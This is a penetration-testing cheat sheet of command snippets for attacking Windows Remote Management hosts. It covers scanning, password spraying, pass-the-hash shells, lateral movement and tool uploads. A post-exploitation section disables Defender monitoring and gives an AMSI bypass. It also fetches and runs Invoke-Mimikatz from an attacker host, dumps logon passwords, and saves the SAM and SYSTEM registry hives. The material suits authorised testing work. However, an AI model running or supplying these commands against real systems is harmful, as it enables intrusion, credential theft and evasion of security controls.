---
id: "mdwkjvq0bmpsiwv0h"
title: "winrm"
description: ""
tags: []
order: "11"
createdAt: "2026-05-30T15:46:27.713Z"
updatedAt: "2026-05-30T15:46:47.102Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"ylq5pm20zmpsiwzu9","order":0,"collapsed":false} -->

### 55ebqailkmpsiwzw8
```bash
nmap -sV -sC -p 5985,5986 $TARGET
```

_Port Discovery & Scanning WinRM runs on TCP 5985 (HTTP) and TCP 5986 (HTTPS)._

**Tags:** winrm, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"55ebqailkmpsiwzw8","language":"bash","sectionId":"ylq5pm20zmpsiwzu9","tags":["winrm","nmap","rustscan","recon","discovery"]} -->

### yaxlgm5hzmpsiwzwf
```bash
rustscan -a $TARGET -p 5985,5986 -- -sV
```

**Tags:** winrm, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"yaxlgm5hzmpsiwzwf","language":"bash","sectionId":"ylq5pm20zmpsiwzu9","tags":["winrm","nmap","rustscan","recon","discovery"]} -->

### yepejueh5mpsiwzwj
```bash
nmap -p 5985,5986 --script http-auth,http-methods $TARGET
```

**Tags:** winrm, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"yepejueh5mpsiwzwj","language":"bash","sectionId":"ylq5pm20zmpsiwzu9","tags":["winrm","nmap","rustscan","recon","discovery"]} -->

## Connectivity & Authentication Check
<!-- section: {"id":"nlqosdy3tmpsiwzuh","order":1,"collapsed":false} -->

### 4mzqdn17qmpsiwzwy
```bash
netexec winrm $TARGET -u $USER -p '$PASS'
```

_Connectivity & Authentication Check Test if WinRM is accessible and credentials are valid._

**Tags:** winrm, authentication, netexec, evil-winrm
<!-- cmd: {"id":"4mzqdn17qmpsiwzwy","language":"bash","sectionId":"nlqosdy3tmpsiwzuh","tags":["winrm","authentication","netexec","evil-winrm"]} -->

### o5wp0rvz7mpsiwzx2
```bash
netexec winrm $TARGET -u $USER -H $HASH
```

**Tags:** winrm, authentication, netexec, evil-winrm
<!-- cmd: {"id":"o5wp0rvz7mpsiwzx2","language":"bash","sectionId":"nlqosdy3tmpsiwzuh","tags":["winrm","authentication","netexec","evil-winrm"]} -->

### ry1t8auybmpsiwzx6
```bash
evil-winrm -i $TARGET -u $USER -p '$PASS'
```

**Tags:** winrm, authentication, netexec, evil-winrm
<!-- cmd: {"id":"ry1t8auybmpsiwzx6","language":"bash","sectionId":"nlqosdy3tmpsiwzuh","tags":["winrm","authentication","netexec","evil-winrm"]} -->

### 8rzwhol1bmpsiwzxb
```bash
evil-winrm -i $TARGET -u $USER -H $HASH
```

**Tags:** winrm, authentication, netexec, evil-winrm
<!-- cmd: {"id":"8rzwhol1bmpsiwzxb","language":"bash","sectionId":"nlqosdy3tmpsiwzuh","tags":["winrm","authentication","netexec","evil-winrm"]} -->

## Evil-WinRM — Full Shell Access
<!-- section: {"id":"n8aywfkr7mpsiwzul","order":2,"collapsed":false} -->

### n2w1oxwrompsiwzxo
```bash
evil-winrm -i $TARGET -u $USER -p '$PASS'
```

_Evil-WinRM — Full Shell Access Interactive PowerShell shell via WinRM._

**Tags:** winrm, evil-winrm, shell, pth, lateral-movement
<!-- cmd: {"id":"n2w1oxwrompsiwzxo","language":"bash","sectionId":"n8aywfkr7mpsiwzul","tags":["winrm","evil-winrm","shell","pth","lateral-movement"]} -->

### 3yxf6luzjmpsiwzxs
```bash
evil-winrm -i $TARGET -u $USER -H $HASH
```

**Tags:** winrm, evil-winrm, shell, pth, lateral-movement
<!-- cmd: {"id":"3yxf6luzjmpsiwzxs","language":"bash","sectionId":"n8aywfkr7mpsiwzul","tags":["winrm","evil-winrm","shell","pth","lateral-movement"]} -->

### 4v08l0xflmpsiwzxx
```bash
evil-winrm -i $TARGET -u $USER -p '$PASS' -S -c cert.pem -k key.pem
```

**Tags:** winrm, evil-winrm, shell, pth, lateral-movement
<!-- cmd: {"id":"4v08l0xflmpsiwzxx","language":"bash","sectionId":"n8aywfkr7mpsiwzul","tags":["winrm","evil-winrm","shell","pth","lateral-movement"]} -->

### 7gm5zf842mpsiwzy1
```bash
evil-winrm -i $TARGET -u $USER -p '$PASS' -s /opt/PowerSploit/Privesc/
```

**Tags:** winrm, evil-winrm, shell, pth, lateral-movement
<!-- cmd: {"id":"7gm5zf842mpsiwzy1","language":"bash","sectionId":"n8aywfkr7mpsiwzul","tags":["winrm","evil-winrm","shell","pth","lateral-movement"]} -->

### wbvhj47tempsiwzy6
```bash
evil-winrm -i $TARGET -u $USER -p '$PASS'
```

**Tags:** winrm, evil-winrm, shell, pth, lateral-movement
<!-- cmd: {"id":"wbvhj47tempsiwzy6","language":"bash","sectionId":"n8aywfkr7mpsiwzul","tags":["winrm","evil-winrm","shell","pth","lateral-movement"]} -->

## Password Spray over WinRM
<!-- section: {"id":"h5sya1cjqmpsiwzup","order":3,"collapsed":false} -->

### 8bn0336nampsiwzyj
```bash
netexec winrm $TARGET -u users.txt -p '$PASS' --continue-on-success
```

_Password Spray over WinRM_

**Tags:** winrm, password-spray, bruteforce, authentication
<!-- cmd: {"id":"8bn0336nampsiwzyj","language":"bash","sectionId":"h5sya1cjqmpsiwzup","tags":["winrm","password-spray","bruteforce","authentication"]} -->

### iesjb6a0hmpsiwzyo
```bash
netexec winrm $TARGET -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

**Tags:** winrm, password-spray, bruteforce, authentication
<!-- cmd: {"id":"iesjb6a0hmpsiwzyo","language":"bash","sectionId":"h5sya1cjqmpsiwzup","tags":["winrm","password-spray","bruteforce","authentication"]} -->

### qk21csppzmpsiwzys
```bash
netexec winrm $CIDR/24 -u $USER -p '$PASS' --continue-on-success
```

**Tags:** winrm, password-spray, bruteforce, authentication
<!-- cmd: {"id":"qk21csppzmpsiwzys","language":"bash","sectionId":"h5sya1cjqmpsiwzup","tags":["winrm","password-spray","bruteforce","authentication"]} -->

## Command Execution via WinRM
<!-- section: {"id":"l58mphx5kmpsiwzus","order":4,"collapsed":false} -->

### angvfu1uqmpsiwzz0
```bash
netexec winrm $TARGET -u $USER -p '$PASS' -x "whoami /all"
```

_Command Execution via WinRM Run commands without interactive shell._

**Tags:** winrm, command-execution, netexec, remote-exec
<!-- cmd: {"id":"angvfu1uqmpsiwzz0","language":"bash","sectionId":"l58mphx5kmpsiwzus","tags":["winrm","command-execution","netexec","remote-exec"]} -->

### qtbij6aexmpsiwzz4
```bash
netexec winrm $TARGET -u $USER -p '$PASS' -x "net localgroup administrators"
```

**Tags:** winrm, command-execution, netexec, remote-exec
<!-- cmd: {"id":"qtbij6aexmpsiwzz4","language":"bash","sectionId":"l58mphx5kmpsiwzus","tags":["winrm","command-execution","netexec","remote-exec"]} -->

### 0cobifycbmpsiwzz8
```bash
netexec winrm $TARGET -u $USER -p '$PASS' -x "ipconfig /all"
```

**Tags:** winrm, command-execution, netexec, remote-exec
<!-- cmd: {"id":"0cobifycbmpsiwzz8","language":"bash","sectionId":"l58mphx5kmpsiwzus","tags":["winrm","command-execution","netexec","remote-exec"]} -->

### skgydhhkwmpsiwzzd
```bash
netexec winrm $TARGET -u $USER -p '$PASS' -X "Get-Process | Sort-Object CPU -Descending | Select -First 10"
```

**Tags:** winrm, command-execution, netexec, remote-exec
<!-- cmd: {"id":"skgydhhkwmpsiwzzd","language":"bash","sectionId":"l58mphx5kmpsiwzus","tags":["winrm","command-execution","netexec","remote-exec"]} -->

## Impacket WinRM Access
<!-- section: {"id":"vegw3yeoompsiwzuw","order":5,"collapsed":false} -->

### qn55q1f8ompsiwzzr
```bash
impacket-wmiexec $DOMAIN/$USER:'$PASS'@$TARGET
```

_Impacket WinRM Access_

**Tags:** winrm, impacket, remote-exec, lateral-movement
<!-- cmd: {"id":"qn55q1f8ompsiwzzr","language":"bash","sectionId":"vegw3yeoompsiwzuw","tags":["winrm","impacket","remote-exec","lateral-movement"]} -->

### 7tbybk2wimpsiwzzv
```bash
impacket-psexec $DOMAIN/$USER:'$PASS'@$TARGET
```

**Tags:** winrm, impacket, remote-exec, lateral-movement
<!-- cmd: {"id":"7tbybk2wimpsiwzzv","language":"bash","sectionId":"vegw3yeoompsiwzuw","tags":["winrm","impacket","remote-exec","lateral-movement"]} -->

## Certificate-Based Auth (WinRM over HTTPS)
<!-- section: {"id":"4xw7gtw9bmpsiwzv0","order":6,"collapsed":false} -->

### cfxxyhqc7mpsix005
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout winrm_client.key -out winrm_client.crt -subj "/CN=$USER"
```

_client.key -out winrm_

**Tags:** winrm, certificate, https, authentication
<!-- cmd: {"id":"cfxxyhqc7mpsix005","language":"bash","sectionId":"4xw7gtw9bmpsiwzv0","tags":["winrm","certificate","https","authentication"]} -->

### lt3lpt6h6mpsix009
```bash
evil-winrm -i $TARGET -u $USER -S -c winrm_client.crt -k winrm_client.key
```

_client.crt -k winrm_

**Tags:** winrm, certificate, https, authentication
<!-- cmd: {"id":"lt3lpt6h6mpsix009","language":"bash","sectionId":"4xw7gtw9bmpsiwzv0","tags":["winrm","certificate","https","authentication"]} -->

## Kerberos Authentication
<!-- section: {"id":"m14z6oqwfmpsiwzv4","order":7,"collapsed":false} -->

### btzfvu1xlmpsix00k
```bash
impacket-getTGT $DOMAIN/$USER:'$PASS' -dc-ip $DC
```

_Kerberos Authentication_

**Tags:** winrm, kerberos, authentication, ticket
<!-- cmd: {"id":"btzfvu1xlmpsix00k","language":"bash","sectionId":"m14z6oqwfmpsiwzv4","tags":["winrm","kerberos","authentication","ticket"]} -->

### jk5m8d88lmpsix00n
```bash
export KRB5CCNAME=./krb5cc_$USER
```

**Tags:** winrm, kerberos, authentication, ticket
<!-- cmd: {"id":"jk5m8d88lmpsix00n","language":"bash","sectionId":"m14z6oqwfmpsiwzv4","tags":["winrm","kerberos","authentication","ticket"]} -->

### 5mjdufzmqmpsix00r
```bash
evil-winrm -i $TARGET -r $DOMAIN
```

**Tags:** winrm, kerberos, authentication, ticket
<!-- cmd: {"id":"5mjdufzmqmpsix00r","language":"bash","sectionId":"m14z6oqwfmpsiwzv4","tags":["winrm","kerberos","authentication","ticket"]} -->

## Post-Exploitation via Evil-WinRM
<!-- section: {"id":"ijsyf5c14mpsiwzv9","order":8,"collapsed":false} -->

### vvnbrunu6mpsix017
```bash
Set-MpPreference -DisableRealtimeMonitoring $true
```

_Post-Exploitation via Evil-WinRM Common post-exploitation commands inside evil-winrm shell._

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"vvnbrunu6mpsix017","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### qtn7hvb80mpsix01c
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"qtn7hvb80mpsix01c","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### 8caoyhbgxmpsix01h
```bash
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://$ATTACKER/Invoke-Mimikatz.ps1')
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"8caoyhbgxmpsix01h","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### le49njx9empsix01l
```bash
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"le49njx9empsix01l","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### c0o0c1owkmpsix01p
```bash
reg save HKLM\SAM sam.bak
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"c0o0c1owkmpsix01p","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### hsuptg4lbmpsix01u
```bash
reg save HKLM\SYSTEM system.bak
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"hsuptg4lbmpsix01u","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### op7kdtubompsix01x
```bash
(New-Object DirectoryServices.DirectorySearcher("(&(objectCategory=user)")).FindAll()
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"op7kdtubompsix01x","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### hg79k29nqmpsix021
```bash
whoami /priv
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"hg79k29nqmpsix021","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

### sxa28kzscmpsix025
```bash
whoami /all
```

**Tags:** winrm, post-exploitation, mimikatz, amsi-bypass, credentials
<!-- cmd: {"id":"sxa28kzscmpsix025","language":"bash","sectionId":"ijsyf5c14mpsiwzv9","tags":["winrm","post-exploitation","mimikatz","amsi-bypass","credentials"]} -->

## File Upload for Exploitation
<!-- section: {"id":"p2mupaqajmpsiwzvc","order":9,"collapsed":false} -->

### sv7d1p7ntmpsix02e
```bash
upload /opt/tools/winPEAS.exe C:\Windows\Temp\wp.exe
```

_File Upload for Exploitation_

**Tags:** winrm, evil-winrm, file-upload, post-exploitation, bloodhound
<!-- cmd: {"id":"sv7d1p7ntmpsix02e","language":"bash","sectionId":"p2mupaqajmpsiwzvc","tags":["winrm","evil-winrm","file-upload","post-exploitation","bloodhound"]} -->

### uvgmpsfvhmpsix02j
```bash
upload /opt/tools/SharpHound.exe C:\Windows\Temp\sh.exe
```

**Tags:** winrm, evil-winrm, file-upload, post-exploitation, bloodhound
<!-- cmd: {"id":"uvgmpsfvhmpsix02j","language":"bash","sectionId":"p2mupaqajmpsiwzvc","tags":["winrm","evil-winrm","file-upload","post-exploitation","bloodhound"]} -->

### zy2q9avnvmpsix02n
```bash
C:\Windows\Temp\sh.exe -c All
```

**Tags:** winrm, evil-winrm, file-upload, post-exploitation, bloodhound
<!-- cmd: {"id":"zy2q9avnvmpsix02n","language":"bash","sectionId":"p2mupaqajmpsiwzvc","tags":["winrm","evil-winrm","file-upload","post-exploitation","bloodhound"]} -->

### ultim0nx9mpsix02r
```bash
download C:\Windows\Temp\20240101_BloodHound.zip ./loot/
```

**Tags:** winrm, evil-winrm, file-upload, post-exploitation, bloodhound
<!-- cmd: {"id":"ultim0nx9mpsix02r","language":"bash","sectionId":"p2mupaqajmpsiwzvc","tags":["winrm","evil-winrm","file-upload","post-exploitation","bloodhound"]} -->

## Network Sweep for WinRM Hosts
<!-- section: {"id":"adrixdodompsiwzvh","order":10,"collapsed":false} -->

### opygu5jjxmpsix037
```bash
netexec winrm $CIDR/24 -u $USER -p '$PASS' --continue-on-success
```

_Network Sweep for WinRM Hosts_

**Tags:** winrm, network-sweep, lateral-movement, discovery
<!-- cmd: {"id":"opygu5jjxmpsix037","language":"bash","sectionId":"adrixdodompsiwzvh","tags":["winrm","network-sweep","lateral-movement","discovery"]} -->

### 31ogggm0bmpsix03a
```bash
nmap -p 5985,5986 --open $CIDR/24 -oG - | grep open
```

**Tags:** winrm, network-sweep, lateral-movement, discovery
<!-- cmd: {"id":"31ogggm0bmpsix03a","language":"bash","sectionId":"adrixdodompsiwzvh","tags":["winrm","network-sweep","lateral-movement","discovery"]} -->

## Common Misconfigurations
<!-- section: {"id":"2wbxtttqmmpsiwzvk","order":11,"collapsed":false} -->

### l04ng1miympsix03k
```bash
netexec winrm $CIDR/24 -u $USER -p '$PASS'
```

_Common Misconfigurations_

**Tags:** winrm, misconfiguration, password-reuse, ntlm
<!-- cmd: {"id":"l04ng1miympsix03k","language":"bash","sectionId":"2wbxtttqmmpsiwzvk","tags":["winrm","misconfiguration","password-reuse","ntlm"]} -->

### 27v7zq49qmpsix03o
```bash
netexec winrm hosts.txt -u Administrator -H $HASH --continue-on-success
```

**Tags:** winrm, misconfiguration, password-reuse, ntlm
<!-- cmd: {"id":"27v7zq49qmpsix03o","language":"bash","sectionId":"2wbxtttqmmpsiwzvk","tags":["winrm","misconfiguration","password-reuse","ntlm"]} -->

### wd7ds7q69mpsix03s
```bash
curl -s http://$TARGET:5985/wsman
```

**Tags:** winrm, misconfiguration, password-reuse, ntlm
<!-- cmd: {"id":"wd7ds7q69mpsix03s","language":"bash","sectionId":"2wbxtttqmmpsiwzvk","tags":["winrm","misconfiguration","password-reuse","ntlm"]} -->

### 25uzcjcg8mpsix03w
```bash
netexec winrm $TARGET -u '' -p ''
```

**Tags:** winrm, misconfiguration, password-reuse, ntlm
<!-- cmd: {"id":"25uzcjcg8mpsix03w","language":"bash","sectionId":"2wbxtttqmmpsiwzvk","tags":["winrm","misconfiguration","password-reuse","ntlm"]} -->

## Lateral Movement One-Liners
<!-- section: {"id":"lfutwx64kmpsiwzvo","order":12,"collapsed":false} -->

### bhyrt81qfmpsix046
```bash
netexec winrm hosts.txt -u $USER -H $HASH -x "hostname" --continue-on-success
```

_Lateral Movement One-Liners_

**Tags:** winrm, lateral-movement, pth, one-liner
<!-- cmd: {"id":"bhyrt81qfmpsix046","language":"bash","sectionId":"lfutwx64kmpsiwzvo","tags":["winrm","lateral-movement","pth","one-liner"]} -->

### 6r7k001ltmpsix049
```bash
for host in $(cat hosts.txt); do evil-winrm -i $host -u $USER -p '$PASS' -c "whoami" 2>/dev/null && echo "[+] $host"; done
```

**Tags:** winrm, lateral-movement, pth, one-liner
<!-- cmd: {"id":"6r7k001ltmpsix049","language":"bash","sectionId":"lfutwx64kmpsiwzvo","tags":["winrm","lateral-movement","pth","one-liner"]} -->
